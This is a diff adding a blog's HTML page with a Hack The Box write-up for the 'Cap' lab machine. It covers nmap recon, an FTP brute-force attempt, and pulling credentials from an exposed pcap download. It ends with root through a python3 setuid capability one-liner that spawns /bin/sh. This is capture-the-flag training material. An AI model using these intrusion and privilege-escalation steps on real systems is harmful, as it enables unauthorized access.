@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="External Recon # As always we start to get a lay of the land with our default &ldquo;nmap&rdquo; scan:
+nmap -sC -sV 10.10.10.245 PORT STATE SERVICE VERSION PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http gunicorn Nothing unusual so far. However, since we have some version numbers let&rsquo;s check them with searchsploit.
+Nothing for vsftp.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/cap/">
+  <meta property="og:site_name" content="www.tagnull.de">
+  <meta property="og:title" content="Cap">
+  <meta property="og:description" content="External Recon # As always we start to get a lay of the land with our default “nmap” scan:
+nmap -sC -sV 10.10.10.245 PORT STATE SERVICE VERSION PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http gunicorn Nothing unusual so far. However, since we have some version numbers let’s check them with searchsploit.
+Nothing for vsftp.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2021-10-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-10-03T00:00:00+00:00">
+<title>Cap | www.tagnull.de</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/logo.png" >
+<link rel="canonical" href="//localhost:1313/docs/writeups/cap/">
+<link rel="stylesheet" href="/book.min.ed4ea100bc0474b4bd01f1e54b29b3e384852ec121eefa92d93ca6dba227b292.css" integrity="sha256-7U6hALwEdLS9AfHlSymz44SFLsEh7vqS2Tym26InspI=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.750ae6d42e724fe6da2cb8dcd52e115a07cc407c51fda2f0f7ed17b4eacf4ad1.js" integrity="sha256-dQrm1C5yT&#43;baLLjc1S4RWgfMQHxR/aLw9&#43;0XtOrPStE=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Cheatsheet</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
+    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
+      <a role="button" class="">Enumeration</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/nmap/" class="">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
+    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
+      <a role="button" class="">Active Directory</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6aa4c6373ac872095050f4c2eba8eb33" class="toggle" checked />
+    <label for="section-6aa4c6373ac872095050f4c2eba8eb33" class="flex justify-between">
+      <a role="button" class="">Writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/bountyhunter/" class="">BountyHunter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/cap/" class="active">Cap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/the-notebook/" class="">The Notebook</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/safe/" class="">Safe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/fortune/" class="">Fortune</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/onetwoseven/" class="">OneTwoSeven</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/querier/" class="">Querier</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/irked/" class="">Irked</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/stratosphere/" class="">Stratosphere</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/access/" class="">Access</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/ypuffy/" class="">Ypuffy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/secnotes/" class="">SecNotes - WriteUp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
+    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
+      <a role="button" class="">Oscp</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-review/" class="">Path to OSCP - Review</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-reporting/" class="">Path to OSCP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oscp/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Cap</strong>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p align="center">
+  <img src="cap-banner.png" />
+</p>
+<hr>
+<h1 id="external-recon">
+  External Recon
+  <a class="anchor" href="#external-recon">#</a>
+</h1>
+<p>As always we start to get a lay of the land with our default &ldquo;nmap&rdquo; scan:</p>
+<pre tabindex="0"><code>nmap -sC -sV 10.10.10.245
+
+PORT   STATE SERVICE VERSION
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    gunicorn
+</code></pre><p>Nothing unusual so far. However, since we have some version numbers let&rsquo;s check them with searchsploit.</p>
+<p>
+  <img src="searchsploit.png" alt="searchsploit" /></p>
+<p>Nothing for vsftp. OpenSSH looks quite new but I suggest checking it aswell.
+I just made a mental note to come back to SSH should other paths seem to be a dead end.
+Gunicorn had no version number, so I skipped the searchsploit aswell. But we can take a look at the website itself.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="explore">
+  Explore
+  <a class="anchor" href="#explore">#</a>
+</h1>
+<p>First thing I noticed is the authenticated user named &ldquo;Nathan&rdquo;. Could be handy if we want to bruteforce SSH or FTP.
+I actually tried bruteforcing FTP with the username &ldquo;nathan&rdquo; and the &ldquo;rockyou&rdquo; wordlist. But I got blacklisted. So that
+was a dead end.</p>
+<p>Let&rsquo;s play with the webapp. I tried to logout and view the settings. But these functions are not implemented. So nothing to gain here.
+The next thing I looked at was the menu entry &ldquo;IP Config&rdquo; and &ldquo;Network Status&rdquo;.</p>
+<p>
+  <img src="menu.png" alt="menu" /></p>
+<p>Both entries return console output of the kind you would expect. IP Config returned the IP Config of the box for example.
+Sometimes developers try to be efficient and pass parameters from the website to the backend. A perfect target for code injection.
+Not this time though. Both outputs seemed to be static and not triggered by some sort of PHP script.</p>
+<p>I then took a look at the last entry &ldquo;Security Snapshot&rdquo;.
+On the website I got some network traffic statistics and an option to download a pcap file of said traffic.</p>
+<p>
+  <img src="networktraffic.png" alt="networktraffic" /></p>
+<p>In the screenshot above you can see, there was no traffic. And the pcap was also empty.
+Hm. What now?</p>
+<p>Well. We know that &ldquo;Nathan&rdquo; logged in at some point. Maybe we can find some credentials in the pcap?
+Looking at the URL bar, we can see that there&rsquo;s a &ldquo;3&rdquo; behind the folder &ldquo;data&rdquo;. And the pcap-name we downloaded aligns with
+that number.</p>
+<p>
+  <img src="download.png" alt="download" /></p>
+<p>Let&rsquo;s check if there&rsquo;s a &ldquo;2.pcap&rdquo;. And there is. Albeit empty too.</p>
+<p>
+  <img src="download2.png" alt="download2" /></p>
+<p>There&rsquo;s even a &ldquo;0.pcap&rdquo;. And this one has indeed data in it.
+Let&rsquo;s download it and open it with wireshark.</p>
+<p>
+  <img src="creds.png" alt="creds" /></p>
+<p>Awesome. We have his FTP credentials.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="exploit">
+  Exploit
+  <a class="anchor" href="#exploit">#</a>
+</h1>
+<p>Let&rsquo;s login with our new credentials via SSH. Why SSH? Well, it&rsquo;s an easy box.
+Nathan probably reused his password, and SSH is far more interessting than FTP. And if it doesn&rsquo;t work, we can come back to FTP.</p>
+<p>
+  <img src="nathan.png" alt="nathan" /></p>
+<p>Told you. Oh, we also have the user flag here.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="internal-recon">
+  Internal Recon
+  <a class="anchor" href="#internal-recon">#</a>
+</h1>
+<p>Once I am on a machine, I do two things. I check if <code>sudo -l</code> gives me some insights and I upload <code>linpeas.sh</code>.
+To do that I fire up a simple http server on my own machine with <code>python3 -m http.server 80</code> and download the file via <code>wget http://&lt;ip&gt;/linpeas.sh</code>.</p>
+<p>
+  <img src="linpeas.png" alt="linpeas" /></p>
+<p>After launching it and going through the output my eyes fell on this entry.</p>
+<p>
+  <img src="capabilities.png" alt="capabilities" /></p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="anchor" href="#privilege-escalation">#</a>
+</h1>
+<p>Capabilities are often easy to exploit. They are 
+  <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">explained here</a>.
+In this case python3 has been allowed to change the UID of a new process. Which means we can start a new process, let&rsquo;s say /bin/sh, with UID 0 aka root - we will have root permissions.</p>
+<p>Let&rsquo;s try it.</p>
+<p><code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'</code></p>
+<p>
+  <img src="root.png" alt="root" /></p>
+<p>Great. It worked as expected. We can take the root flag and finish the box.</p>
+<p>That&rsquo;s it for today. Have a nice one!</p>
+<p>x41</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
